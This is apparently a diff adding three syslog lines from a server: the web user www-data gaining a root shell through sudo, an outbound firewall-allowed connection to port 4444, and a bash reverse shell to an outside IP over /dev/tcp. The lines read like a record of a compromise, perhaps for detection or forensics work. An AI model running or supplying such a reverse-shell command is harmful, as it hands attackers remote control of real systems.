@@ -1,0 +1,3 @@
+Oct  9 17:22:08 app01 sudo:  www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash -i
+Oct  9 17:22:09 app01 kernel: [UFW ALLOW] OUT=eth0 SRC=10.0.1.22 DST=193.37.255.114 PROTO=TCP SPT=48122 DPT=4444
+Oct  9 17:22:09 app01 bash[7781]: bash -i >& /dev/tcp/193.37.255.114/4444 0>&1
